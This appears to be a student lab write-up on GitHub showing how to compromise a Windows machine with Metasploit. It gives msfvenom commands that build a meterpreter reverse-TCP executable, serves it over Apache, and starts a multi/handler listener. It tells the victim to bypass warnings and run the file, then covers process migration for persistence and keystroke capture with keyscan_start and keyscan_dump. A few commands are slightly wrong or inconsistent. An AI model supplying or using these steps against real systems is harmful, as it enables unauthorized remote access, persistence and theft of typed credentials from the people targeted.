# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/67ba58ca-7032-4ff2-ab69-0242bbb60df8)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/95c65d86-8ce0-4855-ad03-0c7f254be941)


copy the fun.exe into the apache /var/www/html folder

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/7fd060e6-1695-4592-87a5-0f94e6a7e6d0)


Start apache server
sudo systemctl apache2 start

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/19462333-65a6-4d0a-bfdd-4bf3f7ce9541)

Check the status of apache2

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/ea765db1-64ce-4d23-a11b-fbeeb99d5059)


## Invoke msfconsole:

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/e8e64906-9674-4960-ad57-fd4d61b19675)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/831609be-a45e-455f-930f-49b3c1f8ba94)


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/4647d707-d536-4127-acdc-047199deb206)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/39834a3b-7bb8-47d1-8974-817a342af301)


Bypass any warning boxes, double-click the file, and allow it to run.

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/d33b6e19-1ed6-4b9f-81c5-5804458f5c96)

On kali give the command exploit

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/fe2b1cfc-89c7-4dd2-bfb0-cf44f01134c8)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/a16e40a6-bca4-4c17-b68d-96840fe5e0e3)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/4505f0a5-83c3-438f-bfc0-eaad817ff7f6)

## Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/374948d5-71b1-4019-89c7-f6d37e314911)

![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/39924375-0e4b-45fa-af17-12a0053d990f)

keyscan_dump	Shows the keystrokes captured so far

## OUTPUT:
![image](https://github.com/Kirupanandhan/Compromising-windows-using-Metasploit/assets/94386222/21bd7c9f-adc2-43ed-bebd-1f45be6136d8)






















## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
